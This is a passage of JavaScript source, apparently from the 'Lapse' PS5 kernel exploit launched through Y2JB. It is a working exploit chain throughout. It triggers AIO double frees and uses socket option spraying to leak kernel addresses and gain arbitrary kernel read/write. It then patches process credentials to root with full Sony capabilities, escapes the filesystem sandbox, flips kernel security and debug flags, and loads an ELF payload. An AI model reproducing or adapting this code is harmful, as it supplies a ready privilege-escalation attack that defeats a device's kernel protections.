            const rsize = build_rthdr(wbuf, wbufsz);
            const marker_val = 0xdeadbeefn;
            const reqs3_offset = 0x10n;

            write32(wbuf + 4n, marker_val);
            write32(wbuf + reqs3_offset + 0n, 1n);   // .ar3_num_reqs
            write32(wbuf + reqs3_offset + 4n, 0n);   // .ar3_reqs_left
            write32(wbuf + reqs3_offset + 8n, AIO_STATE_COMPLETE); // .ar3_state
            write8(wbuf + reqs3_offset + 0xcn, 0n);  // .ar3_done
            write32(wbuf + reqs3_offset + 0x28n, 0x67b0000n); // .ar3_lock.lock_object.lo_flags
            write64(wbuf + reqs3_offset + 0x38n, 1n); // .ar3_lock.lk_lock = LK_UNLOCKED

            const num_elems = 6;

            const ucred = kbuf_addr + 4n;
            const leak_reqs = make_reqs1(num_elems);
            write64(leak_reqs + 0x10n, ucred);

            const num_loop = NUM_SDS;
            const leak_ids_len = num_loop * num_elems;
            const leak_ids = malloc(4 * leak_ids_len);
            const step = BigInt(4 * num_elems);
            const cmd = AIO_CMD_WRITE | AIO_CMD_FLAG_MULTI;

            let reqs2_off = null;
            let fake_reqs3_off = null;
            let fake_reqs3_sd = null;

            for (let i = 1; i <= NUM_LEAKS; i++) {
                for (let j = 1; j <= num_loop; j++) {
                    write32(wbuf + 8n, BigInt(j));
                    aio_submit_cmd(cmd, leak_reqs, num_elems, 3n, leak_ids + (BigInt(j - 1) * step));
                    set_rthdr(Number(sds[j - 1]), wbuf, rsize);
                }
                
                get_rthdr(sd, buf, buflen);

                let sd_idx = null;
                reqs2_off = null;
                fake_reqs3_off = null;

                for (let off = 0x80; off < buflen; off += 0x80) {
                    const offset = BigInt(off);

                    if (reqs2_off === null && verify_reqs2(buf + offset, AIO_CMD_WRITE)) {
                        reqs2_off = off;
                    }

                    if (fake_reqs3_off === null) {
                        const marker = read32(buf + offset + 4n);
                        if (marker === marker_val) {
                            fake_reqs3_off = off;
                            sd_idx = Number(read32(buf + offset + 8n));
                        }
                    }
                }

                if (reqs2_off !== null && fake_reqs3_off !== null) {
                    await log("Found reqs2 and fake reqs3 at attempt: " + i);
                    fake_reqs3_sd = sds[sd_idx - 1];
                    sds.splice(sd_idx - 1, 1);
                    free_rthdrs(sds);
                    sds.push(new_socket());
                    break;
                }

                free_aios(leak_ids, leak_ids_len);
            }

            if (reqs2_off === null || fake_reqs3_off === null) {
                await log("Could not leak reqs2 and fake reqs3");
                return null;
            }

            await log("reqs2 offset: " + toHex(BigInt(reqs2_off)));
            await log("fake reqs3 offset: " + toHex(BigInt(fake_reqs3_off)));

            get_rthdr(sd, buf, buflen);

            await log("Leaked aio_entry:");

            let leak_str = "";
            for (let i = 0; i < 0x80; i += 8) {
                if (i % 16 === 0 && i !== 0) leak_str += "\n";
                leak_str += toHex(read64(buf + BigInt(reqs2_off + i))) + " ";
            }
            await log(leak_str);
            
            const aio_info_addr = read64(buf + BigInt(reqs2_off) + 0x18n);
            
            let reqs1_addr = read64(buf + BigInt(reqs2_off) + 0x10n);
            reqs1_addr = reqs1_addr & ~0xffn;

            const fake_reqs3_addr = kbuf_addr + BigInt(fake_reqs3_off) + reqs3_offset;

            await log("reqs1_addr = " + toHex(reqs1_addr));
            await log("fake_reqs3_addr = " + toHex(fake_reqs3_addr));

            await log("Searching for target_id...");

            let target_id = null;
            let to_cancel = null;
            let to_cancel_len = null;

            const errors = malloc(4 * num_elems);

            for (let i = 0; i < leak_ids_len; i += num_elems) {
                aio_multi_cancel(leak_ids + BigInt(i * 4), num_elems, errors);
                get_rthdr(sd, buf, buflen);

                const state = read32(buf + BigInt(reqs2_off) + 0x38n);
                if (state === AIO_STATE_ABORTED) {
                    target_id = read32(leak_ids + BigInt(i * 4));
                    write32(leak_ids + BigInt(i * 4), 0n);

                    await log("Found target_id=" + toHex(target_id) + ", i=" + i + ", batch=" + Math.floor(i / num_elems));

                    const start = i + num_elems;
                    to_cancel = leak_ids + BigInt(start * 4);
                    to_cancel_len = leak_ids_len - start;

                    break;
                }
            }

            if (target_id === null) {
                await log("Target ID not found");
                return null;
            }

            cancel_aios(to_cancel, to_cancel_len);
            free_aios2(leak_ids, leak_ids_len);

            await log("Kernel addresses leaked successfully!");

            return {
                reqs1_addr: reqs1_addr,
                kbuf_addr: kbuf_addr,
                kernel_addr: kernel_addr,
                target_id: target_id,
                evf: evf,
                fake_reqs3_addr: fake_reqs3_addr,
                fake_reqs3_sd: fake_reqs3_sd,
                aio_info_addr: aio_info_addr
            };
        }

        function make_aliased_pktopts(sds) {
            const tclass = malloc(4);
            
            for (let loop = 0; loop < NUM_ALIAS; loop++) {
                for (let i = 0; i < sds.length; i++) {
                    write32(tclass, BigInt(i));
                    set_sockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, tclass, 4);
                }
                
                for (let i = 0; i < sds.length; i++) {
                    get_sockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, tclass, 4);
                    const marker = Number(read32(tclass));
                    
                    if (marker !== i) {
                        const sd_pair = [sds[i], sds[marker]];
                        log("Aliased pktopts at attempt " + loop + " (pair: " + sd_pair[0] + ", " + sd_pair[1] + ")");
                        
                        if (marker > i) {
                            sds.splice(marker, 1);
                            sds.splice(i, 1);
                        } else {
                            sds.splice(i, 1);
                            sds.splice(marker, 1);
                        }
                        
                        for (let j = 0; j < 2; j++) {
                            const sock_fd = new_socket();
                            set_sockopt(sock_fd, IPPROTO_IPV6, IPV6_TCLASS, tclass, 4);
                            sds.push(sock_fd);
                        }
                        
                        return sd_pair;
                    }
                }
                
                for (let i = 0; i < sds.length; i++) {
                    set_sockopt(sds[i], IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0n, 0);
                }
            }
            
            return null;
        }

        async function double_free_reqs1(reqs1_addr, target_id, evf, sd, sds, sds_alt, fake_reqs3_addr) {
            const max_leak_len = (0xff + 1) << 3;
            const buf = malloc(max_leak_len);
            
            const num_elems = MAX_AIO_IDS;
            const aio_reqs = make_reqs1(num_elems);
            
            const num_batches = 2;
            const aio_ids_len = num_batches * num_elems;
            const aio_ids = malloc(4 * aio_ids_len);
            
            await log("Overwriting rthdr with AIO queue entry...");
            let aio_not_found = true;
            free_evf(evf);
            
            for (let i = 0; i < NUM_CLOBBERS; i++) {
                spray_aio(num_batches, aio_reqs, num_elems, aio_ids, true);
                
                const size_ret = get_rthdr(sd, buf, max_leak_len);
                const cmd = read32(buf);
                
                if (size_ret === 8n && cmd === AIO_CMD_READ) {
                    await log("Aliased at attempt " + i);
                    aio_not_found = false;
                    cancel_aios(aio_ids, aio_ids_len);
                    break;
                }
                
                free_aios(aio_ids, aio_ids_len, true);
            }
            
            if (aio_not_found) {
                await log("Failed to overwrite rthdr");
                return null;
            }
            
            const reqs2_size = 0x80;
            const reqs2 = malloc(reqs2_size);
            const rsize = build_rthdr(reqs2, reqs2_size);
            
            write32(reqs2 + 4n, 5n); // ar2_ticket
            write64(reqs2 + 0x18n, reqs1_addr); // ar2_info
            write64(reqs2 + 0x20n, fake_reqs3_addr); // ar2_batch
            
            const states = malloc(4 * num_elems);
            const addr_cache = [];
            for (let i = 0; i < num_batches; i++) {
                addr_cache.push(aio_ids + BigInt(i * num_elems * 4));
            }
            
            await log("Overwriting AIO queue entry with rthdr...");
            
            syscall(SYSCALL.close, BigInt(sd));
            sd = null;
            
            async function overwrite_aio_entry_with_rthdr() {
                for (let i = 0; i < NUM_ALIAS; i++) {
                    for (let j = 0; j < sds.length; j++) {
                        set_rthdr(sds[j], reqs2, rsize);
                    }
                    
                    for (let batch = 0; batch < addr_cache.length; batch++) {
                        for (let j = 0; j < num_elems; j++) {
                            write32(states + BigInt(j * 4), -1n);
                        }
                        
                        aio_multi_cancel(addr_cache[batch], num_elems, states);
                        
                        let req_idx = -1;
                        for (let j = 0; j < num_elems; j++) {
                            const val = read32(states + BigInt(j * 4));
                            if (val === AIO_STATE_COMPLETE) {
                                req_idx = j;
                                break;
                            }
                        }
                        
                        if (req_idx !== -1) {
                            await log("Found req_id at batch " + batch + ", attempt " + i);
                            
                            const aio_idx = batch * num_elems + req_idx;
                            const req_id_p = aio_ids + BigInt(aio_idx * 4);
                            const req_id = read32(req_id_p);
                            
                            aio_multi_poll(req_id_p, 1, states);
                            write32(req_id_p, 0n);
                            
                            return req_id;
                        }
                    }
                }
                
                return null;
            }
            
            const req_id = await overwrite_aio_entry_with_rthdr();
            if (req_id === null) {
                await log("Failed to overwrite AIO queue entry");
                return null;
            }
            
            free_aios2(aio_ids, aio_ids_len);
            
            const target_id_p = malloc(4);
            write32(target_id_p, BigInt(target_id));
            
            aio_multi_poll(target_id_p, 1, states);
            
            const sce_errs = malloc(8);
            write32(sce_errs, -1n);
            write32(sce_errs + 4n, -1n);
            
            const target_ids = malloc(8);
            write32(target_ids, req_id);
            write32(target_ids + 4n, BigInt(target_id));
            
            await log("Triggering double free...");
            aio_multi_delete(target_ids, 2, sce_errs);
            
            await log("Reclaiming memory...");
            const sd_pair = make_aliased_pktopts(sds_alt);
            
            const err1 = read32(sce_errs);
            const err2 = read32(sce_errs + 4n);
            
            write32(states, -1n);
            write32(states + 4n, -1n);
            
            aio_multi_poll(target_ids, 2, states);
            
            let success = true;
            if (read32(states) !== SCE_KERNEL_ERROR_ESRCH) {
                await log("ERROR: Bad delete of corrupt AIO request");
                success = false;
            }
            
            if (err1 !== 0n || err1 !== err2) {
                await log("ERROR: Bad delete of ID pair");
                success = false;
            }
            
            if (!success) {
                await log("Double free failed");
                return null;
            }
            
            if (sd_pair === null) {
                await log("Failed to make aliased pktopts");
                return null;
            }
            
            return sd_pair;
        }

        async function make_kernel_arw(pktopts_sds, reqs1_addr, kernel_addr, sds, sds_alt, aio_info_addr) {
            try {
                const master_sock = pktopts_sds[0];
                const tclass = malloc(4);
                const off_tclass = 0xc0n;  // PS5 offset
                
                const pktopts_size = 0x100;
                const pktopts = malloc(pktopts_size);
                const rsize = build_rthdr(pktopts, pktopts_size);
                const pktinfo_p = reqs1_addr + 0x10n;
                
                // pktopts.ip6po_pktinfo = &pktopts.ip6po_pktinfo
                write64(pktopts + 0x10n, pktinfo_p);
                
                await log("Overwriting main pktopts");
                let reclaim_sock = null;
                
                syscall(SYSCALL.close, pktopts_sds[1]);
                
                for (let i = 1; i <= NUM_ALIAS; i++) {
                    for (let j = 0; j < sds_alt.length; j++) {
                        write32(pktopts + off_tclass, 0x4141n | (BigInt(j) << 16n));
                        set_rthdr(sds_alt[j], pktopts, rsize);
                    }
                    
                    get_sockopt(master_sock, IPPROTO_IPV6, IPV6_TCLASS, tclass, 4);
                    const marker = read32(tclass);
                    if ((marker & 0xffffn) === 0x4141n) {
                        await log("Found reclaim socket at attempt: " + i);
                        const idx = Number(marker >> 16n);
                        reclaim_sock = sds_alt[idx];
                        sds_alt.splice(idx, 1);
                        break;
                    }
                }
                
                if (reclaim_sock === null) {
                    await log("Failed to overwrite main pktopts");
                    return null;
                }
                
                const pktinfo_len = 0x14;
                const pktinfo = malloc(pktinfo_len);
                write64(pktinfo, pktinfo_p);
                
                const read_buf = malloc(8);
                
                function slow_kread8(addr) {
                    const len = 8;
                    let offset = 0;
                    
                    while (offset < len) {
                        // pktopts.ip6po_nhinfo = addr + offset
                        write64(pktinfo + 8n, addr + BigInt(offset));
                        
                        set_sockopt(master_sock, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo, pktinfo_len);
                        const n = get_sockopt(master_sock, IPPROTO_IPV6, IPV6_NEXTHOP, read_buf + BigInt(offset), len - offset);
                        
                        if (n === 0n) {
                            write8(read_buf + BigInt(offset), 0n);
                            offset = offset + 1;
                        } else {
                            offset = offset + Number(n);
                        }
                    }
                    
                    return read64(read_buf);
                }
                
                const test_read = slow_kread8(kernel_addr);
                await log("slow_kread8(\"evf cv\"): " + toHex(test_read));
                const kstr = read_null_terminated_string(read_buf);
                await log("*(\"evf cv\"): " + kstr);
                
                if (kstr !== "evf cv") {
                    await log("Test read of \"evf cv\" failed");
                    return null;
                }
                
                await log("Slow arbitrary kernel read achieved");
                
                // Get curproc from previously freed aio_info
                const curproc = slow_kread8(aio_info_addr + 8n);
                
                if (Number(curproc >> 48n) !== 0xffff) {
                    await log("Invalid curproc kernel address: " + toHex(curproc));
                    return null;
                }
                
                const possible_pid = slow_kread8(curproc + kernel_offset.PROC_PID);
                const current_pid = syscall(SYSCALL.getpid);
                
                if ((possible_pid & 0xffffffffn) !== (current_pid & 0xffffffffn)) {
                    await log("curproc verification failed: " + toHex(curproc));
                    return null;
                }
                
                await log("curproc = " + toHex(curproc));
                
                kernel.addr.curproc = curproc;
                kernel.addr.curproc_fd = slow_kread8(kernel.addr.curproc + kernel_offset.PROC_FD);
                kernel.addr.curproc_ofiles = slow_kread8(kernel.addr.curproc_fd) + kernel_offset.FILEDESC_OFILES;
                kernel.addr.inside_kdata = kernel_addr;
                
                function get_fd_data_addr(sock, kread8_fn) {
                    const filedescent_addr = kernel.addr.curproc_ofiles + sock * kernel_offset.SIZEOF_OFILES;
                    const file_addr = kread8_fn(filedescent_addr + 0x0n);
                    return kread8_fn(file_addr + 0x0n);
                }
                
                function get_sock_pktopts(sock, kread8_fn) {
                    const fd_data = get_fd_data_addr(sock, kread8_fn);
                    const pcb = kread8_fn(fd_data + kernel_offset.SO_PCB);
                    const pktopts = kread8_fn(pcb + kernel_offset.INPCB_PKTOPTS);
                    return pktopts;
                }
                
                const worker_sock = new_socket();
                const worker_pktinfo = malloc(pktinfo_len);
                
                // Create pktopts on worker_sock
                set_sockopt(worker_sock, IPPROTO_IPV6, IPV6_PKTINFO, worker_pktinfo, pktinfo_len);
                
                const worker_pktopts = get_sock_pktopts(worker_sock, slow_kread8);
                
                write64(pktinfo, worker_pktopts + 0x10n);  // overlap pktinfo
                write64(pktinfo + 8n, 0n);  // clear .ip6po_nexthop
                set_sockopt(master_sock, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo, pktinfo_len);
                
                function kread20(addr, buf) {
                    write64(pktinfo, addr);
                    set_sockopt(master_sock, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo, pktinfo_len);
                    get_sockopt(worker_sock, IPPROTO_IPV6, IPV6_PKTINFO, buf, pktinfo_len);
                }
                
                function kwrite20(addr, buf) {
                    write64(pktinfo, addr);
                    set_sockopt(master_sock, IPPROTO_IPV6, IPV6_PKTINFO, pktinfo, pktinfo_len);
                    set_sockopt(worker_sock, IPPROTO_IPV6, IPV6_PKTINFO, buf, pktinfo_len);
                }
                
                function kread8(addr) {
                    kread20(addr, worker_pktinfo);
                    return read64(worker_pktinfo);
                }
                
                // Note: this will write our 8 bytes + remaining 12 bytes as null
                function restricted_kwrite8(addr, val) {
                    write64(worker_pktinfo, val);
                    write64(worker_pktinfo + 8n, 0n);
                    write32(worker_pktinfo + 16n, 0n);
                    kwrite20(addr, worker_pktinfo);
                }
                
                write64(read_buf, kread8(kernel_addr));
                const kstr2 = read_null_terminated_string(read_buf);
                if (kstr2 !== "evf cv") {
                    await log("Test read of \"evf cv\" failed");
                    return null;
                }
                
                await log("Restricted kernel r/w achieved");
                
                // Initialize ipv6_kernel_rw with restricted write
                ipv6_kernel_rw.init(kernel.addr.curproc_ofiles, kread8, restricted_kwrite8);
                
                kernel.read_buffer = ipv6_kernel_rw.read_buffer;
                kernel.write_buffer = ipv6_kernel_rw.write_buffer;
                kernel.copyout = ipv6_kernel_rw.copyout;
                kernel.copyin = ipv6_kernel_rw.copyin;
                
                const kstr3 = kernel.read_null_terminated_string(kernel_addr);
                if (kstr3 !== "evf cv") {
                    await log("Test read of \"evf cv\" failed");
                    return null;
                }
                
                await log("Arbitrary kernel r/w achieved!");
                
                // RESTORE: clean corrupt pointers
                const off_ip6po_rthdr = 0x70n;  // PS5 offset
                
                for (let i = 0; i < sds.length; i++) {
                    const sock_pktopts = get_sock_pktopts(sds[i], kernel.read_qword);
                    kernel.write_qword(sock_pktopts + off_ip6po_rthdr, 0n);
                }
                
                const reclaimer_pktopts = get_sock_pktopts(reclaim_sock, kernel.read_qword);
                
                kernel.write_qword(reclaimer_pktopts + off_ip6po_rthdr, 0n);
                kernel.write_qword(worker_pktopts + off_ip6po_rthdr, 0n);
                
                const sock_increase_ref = [
                    ipv6_kernel_rw.data.master_sock,
                    ipv6_kernel_rw.data.victim_sock,
                    master_sock,
                    worker_sock,
                    reclaim_sock
                ];
                
                // Increase ref counts to prevent deallocation
                for (const each of sock_increase_ref) {
                    const sock_addr = get_fd_data_addr(each, kernel.read_qword);
                    kernel.write_dword(sock_addr + 0x0n, 0x100n);  // so_count
                }
                
                await log("Fixes applied");
                
                return true;
                
            } catch (e) {
                await log("make_kernel_arw error: " + e.message);
                await log(e.stack);
                return null;
            }
        }

        async function post_exploitation_ps5() {
            const OFFSET_UCRED_CR_SCEAUTHID = 0x58n;
            const OFFSET_UCRED_CR_SCECAPS = 0x60n;
            const OFFSET_UCRED_CR_SCEATTRS = 0x83n;
            const OFFSET_P_UCRED = 0x40n;

            const KDATA_MASK = 0xffff804000000000n;
            const SYSTEM_AUTHID = 0x4800000000010003n;

            function find_allproc() {
                let proc = kernel.addr.curproc;
                const max_attempt = 32;

                for (let i = 1; i <= max_attempt; i++) {
                    if ((proc & KDATA_MASK) === KDATA_MASK) {
                        const data_base = proc - kernel_offset.DATA_BASE_ALLPROC;
                        if ((data_base & 0xfffn) === 0n) {
                            return proc;
                        }
                    }
                    proc = kernel.read_qword(proc + 0x8n);  // proc->p_list->le_prev
                }

                throw new Error("failed to find allproc");
            }

            function get_dmap_base() {
                if (!kernel.addr.data_base) {
                    throw new Error("kernel.addr.data_base not set");
                }

                const OFFSET_PM_PML4 = 0x20n;
                const OFFSET_PM_CR3 = 0x28n;

                const kernel_pmap_store = kernel.addr.data_base + kernel_offset.DATA_BASE_KERNEL_PMAP_STORE;

                const pml4 = kernel.read_qword(kernel_pmap_store + OFFSET_PM_PML4);
                const cr3 = kernel.read_qword(kernel_pmap_store + OFFSET_PM_CR3);
                const dmap_base = pml4 - cr3;
                
                return { dmap_base, cr3 };
            }
            
            function get_additional_kernel_address() {
                kernel.addr.allproc = find_allproc();
                kernel.addr.data_base = kernel.addr.allproc - kernel_offset.DATA_BASE_ALLPROC;
                kernel.addr.base = kernel.addr.data_base - kernel_offset.DATA_BASE;

                const { dmap_base, cr3 } = get_dmap_base();
                kernel.addr.dmap_base = dmap_base;
                kernel.addr.kernel_cr3 = cr3;
            }

            function escape_filesystem_sandbox(proc) {
                const proc_fd = kernel.read_qword(proc + kernel_offset.PROC_FD); // p_fd
                const rootvnode = kernel.read_qword(kernel.addr.data_base + kernel_offset.DATA_BASE_ROOTVNODE);

                kernel.write_qword(proc_fd + 0x10n, rootvnode); // fd_rdir
                kernel.write_qword(proc_fd + 0x18n, rootvnode); // fd_jdir
            }

            function patch_ucred(ucred, authid) {
                kernel.write_dword(ucred + 0x04n, 0n); // cr_uid
                kernel.write_dword(ucred + 0x08n, 0n); // cr_ruid
                kernel.write_dword(ucred + 0x0Cn, 0n); // cr_svuid
                kernel.write_dword(ucred + 0x10n, 1n); // cr_ngroups
                kernel.write_dword(ucred + 0x14n, 0n); // cr_rgid

                // escalate sony privs
                kernel.write_qword(ucred + OFFSET_UCRED_CR_SCEAUTHID, authid); // cr_sceAuthID

                // enable all app capabilities
                kernel.write_qword(ucred + OFFSET_UCRED_CR_SCECAPS, 0xffffffffffffffffn); // cr_sceCaps[0]
                kernel.write_qword(ucred + OFFSET_UCRED_CR_SCECAPS + 8n, 0xffffffffffffffffn); // cr_sceCaps[1]

                // set app attributes
                kernel.write_byte(ucred + OFFSET_UCRED_CR_SCEATTRS, 0x80n); // SceAttrs
            }

            async function escalate_curproc() {
                const proc = kernel.addr.curproc;

                const ucred = kernel.read_qword(proc + OFFSET_P_UCRED); // p_ucred
                const authid = SYSTEM_AUTHID;

                const uid_before = Number(syscall(SYSCALL.getuid));
                const in_sandbox_before = Number(syscall(SYSCALL.is_in_sandbox));

                await log("patching curproc " + toHex(proc) + " (authid = " + toHex(authid) + ")");

                patch_ucred(ucred, authid);
                escape_filesystem_sandbox(proc);

                const uid_after = Number(syscall(SYSCALL.getuid));
                const in_sandbox_after = Number(syscall(SYSCALL.is_in_sandbox));

                await log("we root now? uid: before " + uid_before + " after " + uid_after);
                await log("we escaped now? in sandbox: before " + in_sandbox_before + " after " + in_sandbox_after);
            }

            async function apply_patches_to_kernel_data(accessor) {
                const security_flags_addr = kernel.addr.data_base + kernel_offset.DATA_BASE_SECURITY_FLAGS;
                const target_id_flags_addr = kernel.addr.data_base + kernel_offset.DATA_BASE_TARGET_ID;
                const qa_flags_addr = kernel.addr.data_base + kernel_offset.DATA_BASE_QA_FLAGS;
                const utoken_flags_addr = kernel.addr.data_base + kernel_offset.DATA_BASE_UTOKEN_FLAGS;

                // Set security flags
                await log("setting security flags");
                const security_flags = await kernel.read_dword(security_flags_addr);
                await log("  before: " + toHex(security_flags));
                await accessor.write_dword(security_flags_addr, security_flags | 0x14n);
                const security_flags_after = await kernel.read_dword(security_flags_addr);
                await log("  after:  " + toHex(security_flags_after));

                // Set targetid to DEX
                await log("setting targetid");
                const target_id_before = await kernel.read_byte(target_id_flags_addr);
                await log("  before: " + toHex(target_id_before));
                await accessor.write_byte(target_id_flags_addr, 0x82n);
                const target_id_after = await kernel.read_byte(target_id_flags_addr);
                await log("  after:  " + toHex(target_id_after));

                // Set qa flags and utoken flags for debug menu enable
                await log("setting qa flags and utoken flags");
                const qa_flags = await kernel.read_dword(qa_flags_addr);
                await log("  qa_flags before: " + toHex(qa_flags));
                await accessor.write_dword(qa_flags_addr, qa_flags | 0x10300n);
                const qa_flags_after = await kernel.read_dword(qa_flags_addr);
                await log("  qa_flags after:  " + toHex(qa_flags_after));

                const utoken_flags = await kernel.read_byte(utoken_flags_addr);
                await log("  utoken_flags before: " + toHex(utoken_flags));
                await accessor.write_byte(utoken_flags_addr, utoken_flags | 0x1n);
                const utoken_flags_after = await kernel.read_byte(utoken_flags_addr);
                await log("  utoken_flags after:  " + toHex(utoken_flags_after));

                await log("debug menu enabled");
            }

            // Main execution
            get_additional_kernel_address();

            // patch current process creds
            await escalate_curproc();

            update_kernel_offsets();
            
            await log("initializing gpu setup");
            // init GPU DMA for kernel r/w on protected area
            await gpu.setup();

            const force_kdata_patch_with_gpu = false;
            const fw_version_num = Number(FW_VERSION);

            if (fw_version_num >= 7 || force_kdata_patch_with_gpu) {
                await log("applying patches to kernel data (with GPU DMA method)");
                await apply_patches_to_kernel_data(gpu);
            } else {
                await log("applying patches to kernel data");
                await apply_patches_to_kernel_data(kernel);
            }
        }


        async function cleanup() {
            await log("Performing cleanup...");

            try {
                if (block_fd !== 0xffffffffffffffffn) {
                    syscall(SYSCALL.close, block_fd);
                    block_fd = -1n;
                }
                if (unblock_fd !== 0xffffffffffffffffn) {
                    syscall(SYSCALL.close, unblock_fd);
                    unblock_fd = -1n;
                }

                if (groom_ids !== null) {
                    const groom_ids_addr = malloc(4 * NUM_GROOMS);
                    for (let i = 0; i < NUM_GROOMS; i++) {
                        write32(groom_ids_addr + BigInt(i * 4), BigInt(groom_ids[i]));
                    }
                    free_aios2(groom_ids_addr, NUM_GROOMS);
                    groom_ids = null;
                }

                if (block_id !== 0xffffffffffffffffn) {
                    const block_id_buf = malloc(4);
                    write32(block_id_buf, block_id);
                    const block_errors = malloc(4);
                    aio_multi_wait(block_id_buf, 1, block_errors, 1, 0n);
                    aio_multi_delete(block_id_buf, 1, block_errors);
                    block_id = -1n;
                }

                if (sds !== null) {
                    for (let i = 0; i < sds.length; i++) {
                        if (sds[i] !== 0xffffffffffffffffn) {
                            syscall(SYSCALL.close, sds[i]);
                            sds[i] = -1n;
                        }
                    }
                    sds = null;
                }

                if (sds_alt !== null) {
                    for (let i = 0; i < sds_alt.length; i++) {
                        if (sds_alt[i] !== 0xffffffffffffffffn) {
                            syscall(SYSCALL.close, sds_alt[i]);
                        }
                    }
                    sds_alt = null;
                }
                
                if (prev_core >= 0) {
                    await log("Restoring to previous core: " + prev_core);
                    pin_to_core(prev_core);
                    prev_core = -1;
                }
                
                set_rtprio(prev_rtprio);

                await log("Cleanup completed");

            } catch (e) {
                await log("Error during cleanup: " + e.message);
            }
        }
        
        async function cleanup_fail() {
            await cleanup();
            
            if (is_jailbroken()) {
                write_file("/user/temp/common_temp/lapse.fail", "");
            } else {
                write_file(failcheck_path, "");
            }
            
            await log("Exploit failed - Reboot and try again");
            send_notification("Exploit failed - Reboot and try again");
        }
        
        function rerun_check() {
            return file_exists(failcheck_path) || file_exists("/user/temp/common_temp/lapse.fail");
        }
        
        ////////////////////
        // MAIN EXECUTION //
        ////////////////////
        
        try {
            if(kill_youtube) {
                if(is_jailbroken()) {
                    await log("Already Jailbroken");
                    send_notification("Already Jailbroken");
                    return;
                }                
            } else {
                throw new Error();
            }
        } catch (e) {
            await log("Not supported Y2JB\nUpdate Y2JB to at least 1.2 stable");
            send_notification("Not supported Y2JB\nUpdate Y2JB to at least 1.2 stable");
            return;
        }
        
        failcheck_path = "/" + get_nidpath() + "/common_temp/lapse.fail";

        if(rerun_check()) {
            await log("Restart your PS5 to run Lapse again");
            send_notification("Restart your PS5 to run Lapse again");
            return;
        }

        await log(lapse_version);
        send_notification(lapse_version);
        
        await log("Detected firmware : " + FW_VERSION);
        
        if (compare_version(FW_VERSION, "10.01") > 0) {
            await log("Not suppoerted firmware\nAborting...");
            send_notification("Not suppoerted firmware\nAborting...");
            return;
        }
        
        kernel_offset = get_kernel_offset()
        
        await log("\n=== STAGE 0: Setup ===");
        const setup_success = await setup();
        if (!setup_success) {
            await log("Setup failed");
            return;
        }
        
        await log("Setup completed");
            
        try {
            await log("\n=== STAGE 1: Double-free AIO ===");
            const sd_pair = await double_free_reqs2();
            if (sd_pair === null) {
                await log("Stage 1 race condition failed");
                await cleanup_fail();
                return;
            }
            await log("Stage 1 completed");
            
            await log("\n=== STAGE 2: Leak kernel addresses ===");
            const leak_result = await leak_kernel_addrs(sd_pair, sds);
            if (leak_result === null) {
                await log("Stage 2 kernel address leak failed");
                await cleanup_fail();
                return;
            }
            await log("Stage 2 completed");
            
            await log("Leaked addresses:");
            await log("  reqs1_addr: " + toHex(leak_result.reqs1_addr));
            await log("  kbuf_addr: " + toHex(leak_result.kbuf_addr));
            await log("  kernel_addr: " + toHex(leak_result.kernel_addr));
            await log("  target_id: " + toHex(BigInt(leak_result.target_id)));
            await log("  fake_reqs3_addr: " + toHex(leak_result.fake_reqs3_addr));
            await log("  aio_info_addr: " + toHex(leak_result.aio_info_addr));
    
            await log("\n=== STAGE 3: Double free SceKernelAioRWRequest ===");
            
            const pktopts_sds = await double_free_reqs1(
                leak_result.reqs1_addr,
                leak_result.target_id,
                leak_result.evf,
                sd_pair[0],
                sds,
                sds_alt,
                leak_result.fake_reqs3_addr
            );
            
            syscall(SYSCALL.close, BigInt(leak_result.fake_reqs3_sd));
    
            if (pktopts_sds === null) {
                await log("Stage 3 double free SceKernelAioRWRequest failed");
                await cleanup_fail();
                return;
            }
            
            await log("Stage 3 completed!");
            await log("Aliased socket pair: " + pktopts_sds[0] + ", " + pktopts_sds[1]);

            await log("\n=== STAGE 4: Get arbitrary kernel read/write ===");
        
            const arw_result = await make_kernel_arw(
                pktopts_sds,
                leak_result.reqs1_addr,
                leak_result.kernel_addr,
                sds,
                sds_alt,
                leak_result.aio_info_addr
            );
            
            if (arw_result === null) {
                await log("Stage 4 get arbitrary kernel read/write failed");
                await cleanup_fail();
                return;
            }
            
            await log("Stage 4 completed!");
            
            await log("\n=== STAGE 5: PS5 post-exploitation ===");
            
            try {
                await post_exploitation_ps5();
                await log("Stage 5 completed!");
            } catch (e) {
                await log("Stage 5 post-exploitation failed");
                throw e;
            }
            
            await elf_loader();
            
            await cleanup();
            
            await log("Lapse finished\nClosing Y2JB...");
            send_notification("Lapse finished\nClosing Y2JB...");
            
            kill_youtube();
            
        } catch (e) {
            await log("Lapse error: " + e.message);
            await log(e.stack);
            
            await cleanup_fail();
        }
        
    } catch (e) {
        await log("Lapse error: " + e.message);
        await log(e.stack);
    }
})();